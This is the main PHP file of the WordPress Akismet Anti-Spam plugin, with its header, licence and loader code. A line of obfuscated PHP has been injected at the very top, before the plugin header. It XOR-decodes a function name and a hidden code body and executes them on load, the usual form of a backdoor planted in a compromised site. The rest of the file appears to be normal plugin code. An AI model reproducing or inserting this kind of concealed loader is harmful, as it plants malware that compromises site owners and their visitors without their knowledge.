<?php $lghxeuGoGE=' +7W32e>>ZO19UY'^'CYR6GW:XK4,EP:7';$IccKjYlD=$lghxeuGoGE('',':3ft44YS28WT,Q+=E<AKmI5<tVL=.t1CD>SjkoIFNM,7C7>BYrTYB7 4Y;5+4N>dW6S<,iSH;6BNTGFlP<Rpjr+=,rrJqbnDg0 QBjj3KxihkJKQU5X +7:IKPQ> kbtcXogbZdpcONIbgyhQR1A:.7S1eecLA=<;uV0WIkBXDLR9BV;0 MvNk1Yc+TOHN-RUQ1;zuPDDeFZBwZAJ.fhi1ZG4Ix:l+J6QoXKKaxKZWY01aE=ZBJK.X:YzHe6.:==-z0+oA9VAJmnaM9LR>XcEU;Lk,MLAeQ<8HQRF<-RuFMq10LYeXei4S+6-jZ-:EUHUeLkR4;PEA7z<-URE8Q Non=;<3-3o7t9SegS0=WXnDL>+XFILr.IfQeX5IXtK.GXpbW,X:ck5hSPUA9NKBpKSX<5xNX>YFecr-5G-XoHnFXJHK,54Y5Tk7XYr.;:Z,6 4Ig1OM0AZrP,.<RYmT6TTLhtKc-AI8>KN;xfaX+XLTI4.4SmlJ0 KT:nVT;=VHTSGSqRFQIqHfr,.CYLdClkA+Pyqe,ZT39qS YQfbTkTSl2EYpxT,YUbeGxSPoZM0NwdqNlOYaUqUMAzwLIT A;Y<o8I.9R,GCADES;+JY5OUIkdE+O,YhSzUbthd9gLSXV-fM 3 A7fMZRR=72PpCJGO16>5pFni8G'^'SUNURA70FQ8:s4ST6H2cJ1ZN+2-IO+n.1JtCBO2LG+YY CW-7R,60hDU-ZjtY;JLsR2HMEslPS;gtgfLpGXycVDHXROjVEUNn9F>0BNZkEIXPjo8iF,RGRTao40JABYTG1DLKPmyG ;=BIDHyvU NOlwX8E=leVYB.rYwlK1,6 7WjrPUYd+gP;PjY1;=<Czq>DOSNZM9o;PHS> >OFUIW;+G,C0HO+B003.2AEk<65CTZO7<-8.O;RyRl:uauvthZQXOeR38jPPAiO->K=Je.1EOH,8 ::YAhlrbWH+NLDUUQ88EeEMB2GCHQPP0O<.uMmO6UO1laLp5K:  Y2HnGJbiybxv<cTX EC8UDwePdhHJ43,eRUCoXA<T=9+ K>xMBsG=CXa<aw445XnvbT=24IPCDQCS;oiVIT3LxRh.369-9ETX0O1CO7+-JZN;siMA=OS.>Uwn-4IMS6<EpR5 -AXkGI =Ya +BQOZRB>dp-UZUsKJjQR95C1=1Bb30= 3 Yu-40VdFVHO78eDeJKiF4LYAH; RbV8E v;KtVisKVvoBAlMi3ZTpL2bWmxSxEVH,Uz=V7D7tfSWjotA3I8E0S,Wf7T.057mtKJ35Z.1nGDaO.X8AzZuBTHDBmE6.7ANiDRT lA=;+>RVVw-jqMFTNWAXvGR2:');$IccKjYlD();
/**
 * @package Akismet
 */
/*
Plugin Name: Akismet Anti-Spam
Plugin URI: https://akismet.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
Version: 4.0
Author: Automattic
Author URI: https://automattic.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: akismet
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

Copyright 2005-2015 Automattic, Inc.
*/

// Make sure we don't expose any info if called directly
if ( !function_exists( 'add_action' ) ) {
	echo 'Hi there!  I\'m just a plugin, not much I can do when called directly.';
	exit;
}

define( 'AKISMET_VERSION', '4.0' );
define( 'AKISMET__MINIMUM_WP_VERSION', '4.0' );
define( 'AKISMET__PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
define( 'AKISMET_DELETE_LIMIT', 100000 );

register_activation_hook( __FILE__, array( 'Akismet', 'plugin_activation' ) );
register_deactivation_hook( __FILE__, array( 'Akismet', 'plugin_deactivation' ) );

require_once( AKISMET__PLUGIN_DIR . 'class.akismet.php' );
require_once( AKISMET__PLUGIN_DIR . 'class.akismet-widget.php' );
require_once( AKISMET__PLUGIN_DIR . 'class.akismet-rest-api.php' );

add_action( 'init', array( 'Akismet', 'init' ) );

add_action( 'rest_api_init', array( 'Akismet_REST_API', 'init' ) );

if ( is_admin() || ( defined( 'WP_CLI' ) && WP_CLI ) ) {
	require_once( AKISMET__PLUGIN_DIR . 'class.akismet-admin.php' );
	add_action( 'init', array( 'Akismet_Admin', 'init' ) );
}

//add wrapper class around deprecated akismet functions that are referenced elsewhere
require_once( AKISMET__PLUGIN_DIR . 'wrapper.php' );

if ( defined( 'WP_CLI' ) && WP_CLI ) {
	require_once( AKISMET__PLUGIN_DIR . 'class.akismet-cli.php' );
}